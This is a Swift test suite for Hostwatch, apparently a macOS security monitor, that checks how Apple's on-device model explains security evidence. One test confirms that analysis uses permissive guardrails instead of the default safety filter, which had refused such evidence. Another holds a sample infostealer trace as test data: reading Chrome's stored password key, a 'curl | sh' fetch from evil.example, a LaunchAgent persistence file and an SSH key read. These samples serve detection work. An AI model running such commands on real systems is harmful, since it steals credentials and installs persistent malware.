import Foundation
import FoundationModels
import Testing
@testable import Hostwatch

/// Apple's on-device model: clear messages for its errors, and (opt-in) a run of the real model on
/// security evidence, which its default guardrails used to refuse.
@Suite struct OnDeviceModel {
    @Test func guardrailRefusalIsExplained() {
        let refusal = LanguageModelSession.GenerationError.guardrailViolation(.init(debugDescription: "unsafe"))
        let text = AppleOnDeviceModel.describe(refusal)
        #expect(text.contains("safety filter") && text.contains("Ask Claude"))
        let tooLong = LanguageModelSession.GenerationError.exceededContextWindowSize(.init(debugDescription: "long"))
        #expect(AppleOnDeviceModel.describe(tooLong).contains("too long"))
        #expect(AppleOnDeviceModel.describe(CocoaError(.featureUnsupported)).hasPrefix("On-device model:"))
    }

    @Test func coreEvidenceKeepsTheEventProcessAndSignature() {
        let evidence = """
        ## Event
        kind: net
        pid: 5

        ## Process (ps)
        5 1 me /usr/bin/curl

        ## Parent chain
        1 0 root launchd

        ## Executable
        path: /usr/bin/curl

        ## Process's current connections (lsof)
        curl 5 me TCP 1.2.3.4:443

        ## Other recent activity from PID 5
        12:00 file curl r /etc/hosts
        """
        let core = AppleOnDeviceModel.coreEvidence(evidence)
        #expect(core.hasPrefix("## Event") && core.contains("## Process (ps)") && core.contains("## Parent chain")
                && core.contains("## Executable"))
        #expect(!core.contains("lsof") && !core.contains("Other recent activity"))
        #expect(AppleOnDeviceModel.isRefusal(LanguageModelSession.GenerationError.guardrailViolation(.init(debugDescription: ""))))
        #expect(!AppleOnDeviceModel.isRefusal(CocoaError(.featureUnsupported)))
    }

    @Test func askUsesThePermissiveGuardrailsForAnalysis() {
        // The free-text Ask path must not use the default guardrails (they refuse security evidence).
        #expect(AppleOnDeviceModel.analysisModel !== SystemLanguageModel.default)
    }

    /// The real model on evidence like the one that failed. Opt-in: HOSTWATCH_LIVE_MODEL_TESTS=1
    /// (needs Apple Intelligence; answers vary, so it only checks that the model answers at all).
    @Test(.enabled(if: ProcessInfo.processInfo.environment["HOSTWATCH_LIVE_MODEL_TESTS"] == "1"
                   && AppleOnDeviceModel().status().isReady))
    func realModelAnswersSecurityEvidence() async throws {
        let evidence = """
        ## Event
        kind: exec (processes)
        process name: security
        command line: security find-generic-password -s 'Chrome Safe Storage' -w
        parent: /Users/me/Downloads/helper (unsigned, quarantined)
        ## Network
        helper connected to 45.33.12.7:8443 (raw IP, no DNS); then ran: curl -fsSL http://evil.example/x | sh
        ## Files
        wrote ~/Library/LaunchAgents/com.helper.update.plist; read ~/.ssh/id_ed25519
        """
        let answer = try await AppleOnDeviceModel().explain(AppleOnDeviceModel.askPrompt(evidence: evidence),
                                                            instructions: AIAnalysis.systemPrompt)
        #expect(!answer.isEmpty)
    }
}
